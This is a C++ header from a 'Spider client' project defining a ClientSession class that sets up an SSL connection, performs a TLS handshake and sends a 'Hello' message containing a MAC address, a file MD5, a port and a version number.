//
// Created by Blowa-XPS on 06-Oct-17.
//

#ifndef SPIDER_CLIENT_CLIENTSESSION_HPP
#define SPIDER_CLIENT_CLIENTSESSION_HPP

#include <boost/bind.hpp>
#include <utils/NonCopyable.hpp>
#include <Configuration.hpp>
#include <Protocol/Messages.hpp>
#include "SSLConnection.hpp"

namespace spi
{
    class ClientSession : utils::NonCopyable
    {
    public:
        ClientSession(net::SSLContext &ctx, net::IOManager &service, cfg::Config &conf) : _ctx(ctx), _ioManager(service), _conf(conf)
        {
            if (!_ctx.usePrivateKeyFile("key.pem") || !_ctx.useCertificateFile("cert.pem")) {
                _log(logging::Error) << "SSL Context loading error" << std::endl;
                close();
            }
        }

        ~ClientSession() override = default;

        template <typename CoreCallback>
        void onConnect(CoreCallback callback)
        {
            _connectCallback = callback;
        }

        void connect()
        {
            _log(logging::Info) << "Connecting ClientSession..." << std::endl;
            _sslConnection.asyncConnect(_conf.address, _conf.port, boost::bind(&ClientSession::handshakeSSL, this, net::ErrorPlaceholder));
        }

    private:
        void idontknow()
        {
            _connectCallback(&_sslConnection);
        }

        void close()
        {
                _sslConnection.rawSocket().close();
                _log(logging::Info) << "Closing socket ..." << std::endl;
                _log(logging::Info) << "Closing input filedescriptor ..." << std::endl;
                _ioManager.stop();
                _log(logging::Info) << "Stopping IOService ..." << std::flush;
        }

        void auth(const ErrorCode &errorCode)
        {
            if (!errorCode) {

                proto::Hello hello;

                hello.macAddress.get();
                hello.md5 = utils::MD5(cfg::filename);
                hello.port = _conf.portAcceptor;
                hello.version = 1;

                Buffer buff;

                hello.serializeTypeInfo(buff);
                hello.serialize(buff);

                _log(logging::Info) << "Authenticating ClientSession..." << std::endl;
                _sslConnection.asyncWriteSome(buff, boost::bind(&ClientSession::idontknow, this));
            } else {
                _log(lg::Level::Warning) << "Error " << errorCode.message() << std::endl;
            }
        }

        void handshakeSSL(const ErrorCode &errorCode)
        {
            _log(logging::Info) << "Entering handshaking ClientSession..." << std::endl;
            if (errorCode)
            {
                _log(logging::Info) << "Error while handshaking ClientSession..." << std::endl;
                return;
            }
            _log(logging::Info) << "Handshaking ClientSession..." << std::endl;
            _sslConnection.asyncHandshake(net::SSLConnection::HandshakeType::Client, boost::bind(&ClientSession::auth, this, net::ErrorPlaceholder));
        }

        std::function<void(net::SSLConnection *)> _connectCallback{};

        net::SSLContext &_ctx;
        net::IOManager &_ioManager;
        net::SSLConnection _sslConnection{_ioManager, _ctx};
        logging::Logger _log{"server-session", logging::Level::Info};
        cfg::Config _conf;
    };
}

#endif //SPIDER_CLIENT_CLIENTSESSION_HPP
